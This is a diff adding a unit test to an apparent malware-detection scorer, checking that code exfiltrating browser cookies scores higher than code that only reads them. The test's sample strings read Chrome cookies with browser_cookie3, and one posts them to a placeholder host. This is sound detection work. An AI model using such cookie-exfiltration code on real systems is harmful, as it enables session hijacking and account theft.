@@ -622,3 +622,26 @@ def collect():
     decide([analysis], model)
 
     assert model.calls == [canonicalize_model_tokens(analysis.tokens)]
+
+
+def test_context_causal_scores_browser_session_transfer_by_evidence_strength():
+    config = CascadeConfig(rule_aggregation="context-causal-v6")
+    cookie_only = PythonExtractor().analyze_source(
+        "import browser_cookie3\ncookies = browser_cookie3.chrome()\n",
+        "cookies.py",
+    )
+    unrelated = PythonExtractor().analyze_source(
+        "import browser_cookie3, requests\n"
+        "cookies = browser_cookie3.chrome()\n"
+        'requests.post("https://x.invalid", json={"event": "startup"})\n',
+        "cookies.py",
+    )
+    exact = PythonExtractor().analyze_source(
+        "import browser_cookie3, requests\n"
+        "cookies = browser_cookie3.chrome()\n"
+        'requests.post("https://x.invalid", json={"cookies": str(cookies)})\n',
+        "cookies.py",
+    )
+    assert decide([cookie_only], config=config).rule_score == 12
+    assert decide([unrelated], config=config).rule_score == 17
+    assert decide([exact], config=config).rule_score == 36
